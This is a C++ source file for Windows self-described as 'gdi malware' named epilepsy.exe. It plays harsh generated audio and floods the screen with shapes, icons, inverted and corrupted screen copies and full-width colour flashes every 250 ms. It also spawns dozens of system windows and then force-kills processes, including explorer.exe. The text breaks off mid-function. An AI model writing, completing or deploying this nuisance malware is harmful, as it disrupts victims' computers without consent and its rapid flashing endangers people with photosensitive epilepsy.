#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <iostream>

#ifndef SCREEN_WID
#define SCREEN_WID 1920
#endif

#ifndef SCREEN_LEN
#define SCREEN_LEN 1080
#endif

// epilepsy.exe - gdi malware made by me

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = {1, WAVE_FORMAT_PCM, 10000, 10000, 1, 8, 0};
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[10000 * 15] = {};

	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t*((t&4096?t%65536<59392?7:t&7:16)+(1&t>>14))>>(3&-t>>(t&2048?2:10))|t>>(t&16384?t&4096?10:3:2));
	}

	WAVEHDR header = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = {1, WAVE_FORMAT_PCM, 11500, 11500, 1, 8, 0};
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11500 * 15] = {};

	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t&t>>16|t&t>>8|t&t>>4);
	}

	WAVEHDR header = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = {1, WAVE_FORMAT_PCM, 10000, 10000, 1, 8, 0};
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[10000 * 15] = {};

	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t&(t<<(t&1?18:9))|t&(t<<(t&3?6:3))|t&(t<<(t&7?1:2))>>7|(3&t?t:0));
	}

	WAVEHDR header = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = {1, WAVE_FORMAT_PCM, 12000, 12000, 1, 8, 0};
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12000 * 16] = {};

	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>((t>>t)-(t>>1)*(t>>8)|t-(t));
	}

	WAVEHDR header = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = {1, WAVE_FORMAT_PCM, 18000, 18000, 1, 8, 0};
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[18000 * 15] = {};

	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t<<t>>t>>t<<t*(62&t)+-1|t);
	}

	WAVEHDR header = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = {1, WAVE_FORMAT_PCM, 7600, 7600, 1, 8, 0};
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[7600 * 15] = {};

	for (__int128_t t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t^(t>>32)^(t<<6)+(t<<(t&127))>>52+(16&t)/(t?-2:1)*(t&2<4?t>1&t*(t^2)|3&t>>t:-t)>>t|t<<(t&127)&(t|t)*6&t|t);
	}

	WAVEHDR header = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

// Payload 1
DWORD WINAPI lines(LPVOID lpParam) {
	srand(static_cast<unsigned int>(time(nullptr)));
	HDC hdc = GetDC(NULL);

	while (true) {
		BYTE r = rand() % 255 + 0;
		BYTE g = rand() % 255 + 0;
		BYTE b = rand() % 255 + 0;
		int x = rand() % SCREEN_LEN + 0;
		int y = rand() % SCREEN_WID + 0;
		int size = rand() % 100 + 1;
		HPEN pen = CreatePen(PS_SOLID, 10, RGB(r, g, b));
		SelectObject(hdc, pen);
		int counter = 0;

		LineTo(hdc, x + size, y);
		LineTo(hdc, x + size, y + size);
		LineTo(hdc, x, y + size);
		LineTo(hdc, x, y);

		DeleteObject(pen);

		counter++;
		if (counter > 10) {
			break;
		}
	}

	ReleaseDC(NULL, hdc);

	return 0;
}

DWORD WINAPI circles(LPVOID lpParam) {
	srand(static_cast<unsigned int>(time(nullptr)));

	HDC hdc = GetDC(NULL);
	int radius = 50;

	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		HPEN pen = CreatePen(PS_SOLID, 5, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		SelectObject(hdc, pen);
		int x = rand() % 850 + 800;
		int y = rand() % 1920;

		if (x < 0 || y < 0) {
			x = x++;
			y = y++;
		}

		Ellipse(hdc, x + radius, y + radius, x - radius, y - radius);

		DeleteObject(pen);
		DeleteObject(brush);
	}

	ReleaseDC(NULL, hdc);
	return 0;
}

DWORD WINAPI icons(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HICON icon1 = LoadIcon(NULL, IDI_APPLICATION);
	HICON icon2 = LoadIcon(NULL, IDI_ASTERISK);
	HICON icon3 = LoadIcon(NULL, IDI_ERROR);
	HICON icon4 = LoadIcon(NULL, IDI_EXCLAMATION);
	HICON icon5 = LoadIcon(NULL, IDI_HAND);
	HICON icon6 = LoadIcon(NULL, IDI_INFORMATION);
	HICON icon7 = LoadIcon(NULL, IDI_QUESTION);
	HICON icon8 = LoadIcon(NULL, IDI_SHIELD);
	HICON icon9 = LoadIcon(NULL, IDI_WARNING);
	HICON icon10 = LoadIcon(NULL, IDI_WINLOGO);

	while (true) {
		int x1 = rand() % 1920 + 1700;
		int y1 = rand() % 1080;
		int x2 = rand() % 1920 + 1700;
		int y2 = rand() % 1080;
		int x3 = rand() % 1920 + 1700;
		int y3 = rand() % 1080;
		int x4 = rand() % 1920 + 1700;
		int y4 = rand() % 1080;
		int x5 = rand() % 1920 + 1700;
		int y5 = rand() % 1080;
		int x6 = rand() % 1920 + 1700;
		int y6 = rand() % 1080;
		int x7 = rand() % 1920 + 1700;
		int y7 = rand() % 1080;
		int x8 = rand() % 1920 + 1700;
		int y8 = rand() % 1080;
		int x9 = rand() % 1920 + 1700;
		int y9 = rand() % 1080;
		int x10 = rand() % 1920 + 1700;
		int y10 = rand() % 1080;

		DrawIcon(hdc, x1, y1, icon1);
		DrawIcon(hdc, x2, y2, icon2);
		DrawIcon(hdc, x3, y3, icon3);
		DrawIcon(hdc, x4, y4, icon4);
		DrawIcon(hdc, x5, y5, icon5);
		DrawIcon(hdc, x6, y6, icon6);
		DrawIcon(hdc, x7, y7, icon7);
		DrawIcon(hdc, x8, y8, icon8);
		DrawIcon(hdc, x9, y9, icon9);
		DrawIcon(hdc, x10, y10, icon10);
	}

	ReleaseDC(NULL, hdc);

	return 0;
}

// Payload 2
DWORD WINAPI colorSpam(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = 1920;
	int h = 1080;

	RECT rect;
	rect.top = 0;
	rect.bottom = h / 2;
	rect.left = 0;
	rect.right = w;

	HBRUSH red_brush = CreateSolidBrush(RGB(255, 0, 0));
	HBRUSH green_brush = CreateSolidBrush(RGB(0, 255, 0));
	HBRUSH blue_brush = CreateSolidBrush(RGB(0, 0, 255));
	
	while (true) {
		FillRect(hdc, &rect, red_brush);
		Sleep(250);
		FillRect(hdc, &rect, green_brush);
		Sleep(250);
		FillRect(hdc, &rect, blue_brush);
		Sleep(250);
		FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
		Sleep(250);
		FillRect(hdc, &rect, (HBRUSH)GetStockObject(WHITE_BRUSH));
	}
	return 0;
}

DWORD WINAPI polygons(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);

	while (true) {
		int x1 = rand()%1920, x2 = rand()%1920, x3 = rand()%1920, x4 = rand()%1920, x5 = rand()%1920, x6 = rand()%1920, x7 = rand()%1920, x8 = rand()%1920, x9 = rand()%1920, x10 = rand()%1920;
		int y1 = rand()%1080+540, y2 = rand()%1080+540, y3 = rand()%1080+540, y4 = rand()%1080+540, y5 = rand()%1080+540, y6 = rand()%1080+540, y7 = rand()%1080+540, y8 = rand()%1080+540, y9 = rand()%1080+540, y10 = rand()%1080+540; 
		
		BYTE r = rand() % 255;
		BYTE g = rand() % 255;
		BYTE b = rand() % 255;
		COLORREF color = RGB(r, g, b);

		HPEN pen = CreatePen(PS_SOLID, 10, color);
		SelectObject(hdc, pen);

		HBRUSH brush = CreateSolidBrush(color);
		SelectObject(hdc, brush);

		POINT points[] = {{x1, y1}, {x2, y2}, {x3, y3}, {x4, y4}, {x5, y5}, {x6, y6}, {x7, y7}, {x8, y8}, {x9, y9}, {x10, y10}};
		int num = 10;

		Polygon(hdc, points, num);
		DeleteObject(pen);
		DeleteObject(brush);
	}

	ReleaseDC(NULL, hdc);
	return 0;
}

// Payload 3
DWORD WINAPI ropOperations(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC memDC = CreateCompatibleDC(hdc);

	HBITMAP bitmap = CreateCompatibleBitmap(hdc, 1920, 1080);
	SelectObject(memDC, bitmap);

	while (true) {
		int x = rand() % 1920;
		int y = rand() % 1080;
		int cx = rand() % 1920;
		int cy = rand() % 1080; 
		int x1 = rand() % 1920;
		int y1 = rand() % 1080;

		int x2 = rand() % 1920;
		int y2 = rand() % 1080;
		int cx1 = rand() % 1920;
		int cy1 = rand() % 1080;
		int x3 = rand() % 1920;
		int y3 = rand() % 1080;

		int x4 = rand() % 1920;
		int y4 = rand() % 1080;
		int cx2 = rand() % 1920;
		int cy2 = rand() % 1080;
		int x5 = rand() % 1920;
		int y5 = rand() % 1080;

		int x6 = rand() % 1920;
		int y6 = rand() % 1080;
		int cx3 = rand() % 1920;
		int cy3 = rand() % 1080;
		int x7 = rand() % 1920;
		int y7 = rand() % 1080;

		int x8 = rand() % 1920;
		int y8 = rand() % 1080;
		int cx4 = rand() % 1920;
		int cy4 = rand() % 1080;
		int x9 = rand() % 1920;
		int y9 = rand() % 1080;

		BitBlt(hdc, x, y, cx, cy, hdc, x1, y1, SRCAND);
		BitBlt(hdc, x2, y2, cx1, cy1, hdc, x3, y3, SRCINVERT);
		BitBlt(hdc, x4, y4, cx2, cy2, hdc, x5, y5, SRCERASE);
		BitBlt(hdc, x6, y6, cx3, cy3, hdc, x7, y7, NOTSRCERASE);

		BitBlt(hdc, x8, y8, cx4, cy4, memDC, x9, y9, SRCCOPY);
	}

	SelectObject(memDC, bitmap);
	DeleteDC(memDC);
	ReleaseDC(NULL, hdc);
	return 0;
}

// Payload 4
DWORD WINAPI spamWindows(LPVOID lpParam) {
	int counter = 0;
	while (counter < 11) {
		ShellExecuteA(NULL, "open", "C:\\Windows\\explorer.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Windows\\explorer.exe", "ms-clock:", NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\Control.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Windows\\system32\\calc.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\notepad.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, NULL, SW_SHOWDEFAULT);
		ShellExecuteA(NULL, "open", "C:\\Program Files\\Windows Mail\\wabmig.exe", NULL, NULL, SW_SHOWDEFAULT);
		counter++;
	}
	return 0;
}

void terminateWindows() {
	system("taskkill /f /im Control.exe");
	system("powershell -Command \"Get-Process | Where-Object { $_.Name -like '*Calculator*' } | ForEach-Object { Stop-Process -Id $_.Id -Force }\"");
	system("powershell -Command \"Stop-Process -Name Time\"");
	system("taskkill /f /im powershell.exe");
	system("taskkill /f /im powershell_ise.exe");
	system("taskkill /f /im cmd.exe");
	system("taskkill /f /im notepad.exe");
	system("taskkill /f /im msedge.exe");
	system("taskkill /f /im wabmig.exe");
	system("taskkill /f /im explorer.exe");
	system("start explorer.exe");
}

DWORD WINAPI rgbSpin(LPVOID lpParam) {
	int sw = 1920;
	int sh = 1080;
	int radius = 30;
	int duration = 15000;
	DWORD start = GetTickCount();
	double angle = 30;

	while (true) {
		if (GetTickCount() - start > duration) {
			break;
		}

		HDC hdc = GetDC(NULL);
		float x = cos(angle) * radius;
		float y = sin(angle) * radius;
		BYTE r = rand() % 255;
		BYTE g = rand() % 255;
		BYTE b = rand() % 255;
		HBRUSH brush = CreateSolidBrush(RGB(r, g, b));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCERASE);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
		angle = fmod(angle + M_PI / 180, angle * M_PI);
	}
	terminateWindows();
	return 0;
}

// Payload 5
class MemoryGuard {
	public:
	RGBQUAD* data;
	MemoryGuard() : data(nullptr) {};

	bool allocate(size_t size) {
		data = (RGBQUAD*)VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		return data != nullptr;
	}

	~MemoryGuard() {
		if (data != nullptr) {
			VirtualFree(data, 0, MEM_RELEASE);
		}
	}
};

DWORD WINAPI colors1(LPVOID lpParam) {
	int time = GetTickCount();
	DWORD start = GetTickCount();
	int duration = 5000;
	int sw = 1920;
	int sh = 1080;
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (sw * sh + sw) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	try {
		MemoryGuard memory;
		if (!memory.allocate((sw * sh + sw) * sizeof(RGBQUAD))) {
			std::cerr << "A FATAL ERROR HAS OCCURRED, PLEASE RESTART THE PROGRAM.";
			auto msg = MessageBoxA(NULL, "PLEASE RESTART THE PROGRAM!", "FATAL ERROR", MB_ABORTRETRYIGNORE | MB_ICONSTOP);
			if (msg == IDABORT) {
				exit(0);
			} else if (msg == IDRETRY) {
				char path[MAX_PATH];
				GetModuleFileNameA(NULL, path, MAX_PATH);
				STARTUPINFOA si = {0};
				PROCESS_INFORMATION pi = {0};
				CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
				ExitProcess(0);
			} else if (msg == IDIGNORE) {
				return 1;
			} else {
				exit(0);
			}
		}
		for (int i = 0;; i++, i %= 3) {
			HDC desk = GetDC(NULL);
			HDC hdcdc = CreateCompatibleDC(desk);
			HBITMAP hbm = CreateBitmap(sw, sh, 1, 32, data);
			SelectObject(hdcdc, hbm);
			BitBlt(hdcdc, 0, 0, sw, sh, desk, 0, 0, PATCOPY);
			GetBitmapBits(hbm, sw * sh * 4, data);
			int v = 0;
			BYTE byte = 0;
			if ((GetTickCount() - time) > 60000) {
				byte = rand() % 30;
			}
			for (int i = 0; sw * sh > i; i++) {
				INT x = i % sw, y = i / sw;
				if (!(i % sh) && !(rand() % 110)) {
					v = rand() % 24;
				}
				*((BYTE*)data + 4 * i + v) += x^y;
			}
			SetBitmapBits(hbm, sw * sh * 4, data);
			BitBlt(desk, 0, 0, sw, sh, hdcdc, 0, 0, NOTSRCERASE);
			DeleteObject(hbm);
			DeleteObject(hdcdc);
			DeleteObject(desk);
			if (GetTickCount() - start > duration) {
				break;
			}
		}
	} catch (std::exception& e) {
		std::cerr << "FATAL ERROR: " << e.what() << std::endl;
		if (data) VirtualFree(data, 0, MEM_RELEASE);
		return 1;
	}
	if (data) VirtualFree(data, 0, MEM_RELEASE);
	std::cout << "Deallocated";
	return 0;
}

DWORD WINAPI colors2(LPVOID lpParam) {
	int time = GetTickCount();
	int sw = 1920;
	int sh = 1080;
	DWORD start = GetTickCount();
	int duration = 5000;
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (sw * sh + sw) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	try {
		MemoryGuard memory;
		if (!memory.allocate((sw * sh + sw) * sizeof(RGBQUAD))) {
			std::cerr << "A FATAL ERROR HAS OCCURRED, PLEASE RESTART THE PROGRAM";
			auto msg = MessageBoxA(NULL, "PLEASE RESTART THE PROGRAM!", "FATAL ERROR", MB_ABORTRETRYIGNORE | MB_ICONSTOP);
			if (msg == IDABORT) {
				exit(0);
			} else if (msg == IDRETRY) {
				char path[MAX_PATH];
				GetModuleFileNameA(NULL, path, MAX_PATH);
				STARTUPINFOA si = {0};
				PROCESS_INFORMATION pi = {0};
				CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
				ExitProcess(0);
			} else if (msg == IDIGNORE) {
				return 1;
			} else {
				exit(0);
			}
		}
		for (int i = 0;; i++, i %= 3) {
			HDC desk = GetDC(NULL);
			HDC hdcdc = CreateCompatibleDC(desk);
			HBITMAP hbm = CreateBitmap(sw, sh, 1, 32, data);
			SelectObject(hdcdc, hbm);
			BitBlt(hdcdc, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
			GetBitmapBits(hbm, sw * sh * 4, data);
			int v = 0;
			BYTE byte = 0;
			if ((GetTickCount() - time) > 60000) {
				byte = rand() % 30;
			}
			for (int i = 0; sw * sh > i; i++) {
				INT x = i % sw, y = i / sw;
				if (!(i % sh) && !(rand() % 1000)) {
					v = rand() % 1000;
				}
				*((BYTE*)data + 4 * i + v) += x^y;
			}
			SetBitmapBits(hbm, sw * sh * 4, data);
			BitBlt(desk, 0, 0, sw, sh, hdcdc, 0, 0, NOTSRCCOPY);
			DeleteObject(hbm);
			DeleteObject(hdcdc);
			DeleteObject(desk);
			if (GetTickCount() - start > duration) {
				break;
			}
		}
	} catch(std::exception& e) {
		std::cerr << "FATAL ERROR: " << e.what() << std::endl;
		if (data) VirtualFree(data, 0, MEM_RELEASE);
		return 1;
	}
	if (data) VirtualFree(data, 0, MEM_RELEASE);
	std::cout << "Deallocated";
	return 0;
}

DWORD WINAPI colors3(LPVOID lpParam) {
	int time = GetTickCount();
	int sw = 1920;
	int sh = 1080;
	DWORD start = GetTickCount();
	int duration = 5000;
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (sw * sh + sw) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	try {
		MemoryGuard memory;
		if (!memory.allocate((sw * sh + sw) * sizeof(RGBQUAD))) {
			std::cerr << "A FATAL ERROR HAS OCCURRED, PLEASE RESTART THE PROGRAM!";
			auto msg = MessageBoxA(NULL, "PLEASE RESTART THE PROGRAM!", "FATAL ERROR", MB_ABORTRETRYIGNORE | MB_ICONSTOP);
			if (msg == IDABORT) {
				exit(0);
			} else if (msg == IDRETRY) {
				char path[MAX_PATH];
				GetModuleFileNameA(NULL, path, MAX_PATH);
				STARTUPINFOA si = {0};
				PROCESS_INFORMATION pi = {0};
				CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
				ExitProcess(0);
			} else if (msg == IDIGNORE) {
				return 1;
			} else {
				exit(0);
			}
		}
		for (int i = 0;; i++, i %= 3) {
			HDC desk = GetDC(NULL);
			HDC hdcdc = CreateCompatibleDC(desk);
			HBITMAP hbm = CreateBitmap(sw, sh, 1, 32, data);
			SelectObject(hdcdc, hbm);
			BitBlt(hdcdc, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
			GetBitmapBits(hbm, sw * sh * 4, data);
			int v = 0;
			BYTE byte = 0;
			if ((GetTickCount() - time) > 60000) {
				byte = rand() % 30;
			}
			for (int i = 0; sw * sh > i; i++) {
				INT x = i % sw, y = i / sw;
				if (!(i % sh) && !(rand() % 1)) {
					v = rand() % 1;
				}
				int digit = rand() % 5;
				switch(digit) {
					case 1:
						*((BYTE*)data + 4 * i + v) += pow(cos(x^y|y^x), sin((y&x*-100)^(x&y*-100))+(tan(x^y&&y^(x||y)||(y||x))));
						*((BYTE*)data + 4 * i + v) ^= rand() % 255;
						break;
					case 2:
						*((BYTE*)data + 4 * i + v) -= pow(cos(x^y|y^x), sin((y&x*-100)^(x&y*-100))+(tan(x^y&&y^(x||y)||(y||x))));
						*((BYTE*)data + 4 * i + v) ^= rand() % 255;
						break;
					case 3:
						*((BYTE*)data + 4 * i + v) *= pow(cos(x^y|y^x), sin((y&x*-100)^(x&y*-100))+(tan(x^y&&y^(x||y)||(y||x))));
						*((BYTE*)data + 4 * i + v) ^= rand() % 255;
						break;
					case 4: 
						*((BYTE*)data + 4 * i + v) /= pow(cos(x^y|y^x), sin((y&x*-100)^(x&y*-100))+(tan(x^y&&y^(x||y)||(y||x))));
						*((BYTE*)data + 4 * i + v) ^= rand() % 255;
						break;
				}
			}
			SetBitmapBits(hbm, sw * sh * 4, data);
			BitBlt(desk, 0, 0, sw, sh, hdcdc, 0, 0, SRCAND);
			DeleteObject(hbm);
			DeleteObject(hdcdc);
			DeleteObject(desk);
			if (GetTickCount() - start > duration) {
				break;
			}
		}
	} catch (std::exception& e) {
		std::cerr << "FATAL ERROR: " << e.what() << std::endl;
		if (data) VirtualFree(data, 0, MEM_RELEASE);
		return 1;
	}
	if (data) VirtualFree(data, 0, MEM_RELEASE);
	std::cout << "Deallocated";
	return 0;
}

// Payload 6
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

DWORD WINAPI final1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	int w = 1920/2;
	int h = 1080/2;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, rand() % 100, rand() % 100, w, h, hdcScreen, rand() % 100, rand() % 100, DSTINVERT);
		for (int i = 0; i < w * h; i++) {
			int x = static_cast<int>(cos(static_cast<double>(i))) % static_cast<int>((static_cast<double>(w)));
			int y = (i^w)*(M_PI) / (w^i)*(M_PI);
			rgbScreen[i].rgb ^= static_cast<int>((x + i * 4/tan(x+y)) - static_cast<int>((y + i * 4/tan(x-y))));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, rand() % 100, rand() % 100, SRCINVERT);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI final2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	int w = 1920/2;
	int h = 1080/2;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, rand() % 100, rand() % 100, w, h, hdcScreen, rand() % 100, rand() % 100, SRCAND);
		for (int i = 0; i < w * h; i++) {
			int x = static_cast<int>(cos(static_cast<double>(i))) % static_cast<int>((static_cast<double>(w)));
			int y = (i^w)*(M_PI) / (w^i)*(M_PI);
			rgbScreen[i].rgb ^= static_cast<int>((x + i * 4/tan(x+y)) - static_cast<int>((y + i * 4/tan(x-y))));
		}
		BitBlt(hdcScreen, 1920 - w, 0, w, h, hdcMem, rand() % 100, rand() % 100, 0x00C000CA);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI final3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	int w = 1920/2;
	int h = 1080/2;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 1080 - h, w, h, hdcScreen, rand() % 100, rand() % 100, NOTSRCERASE);
		for (int i = 0; i < w * h; i++) {
			int x = static_cast<int>(cos(static_cast<double>(i))) % static_cast<int>((static_cast<double>(w)));
			int y = (i^w)*(M_PI) / (w^i)*(M_PI);
			rgbScreen[i].rgb ^= static_cast<int>((x + i * 4/tan(x+y)) - static_cast<int>((y + i * 4/tan(x-y))));
		}
		BitBlt(hdcScreen, 0, 1080 - h, w, h, hdcMem, rand() % 100, rand() % 100, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI final4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	int w = 1920/2;
	int h = 1080/2;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 1920 - w, 1080 - h, w, h, hdcScreen, rand() % 100, rand() % 100, PATPAINT);
		for (int i = 0; i < w * h; i++) {
			int x = static_cast<int>(cos(static_cast<double>(i))) % static_cast<int>((static_cast<double>(w)));
			int y = (i^w)*(M_PI) / (w^i)*(M_PI);
			rgbScreen[i].rgb ^= static_cast<int>((x + i * 4/tan(x+y)) - static_cast<int>((y + i * 4/tan(x-y))));
		}
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 1920 - w, 1080 - h, SRCINVERT);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI melt(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(NULL);
		int w = 1920;
		int h = 1080;
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 1000;
		for (int i = 0; i < numShifts; i++) {
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 3) - 1;
			int dy = (rand() % 3) - 1;
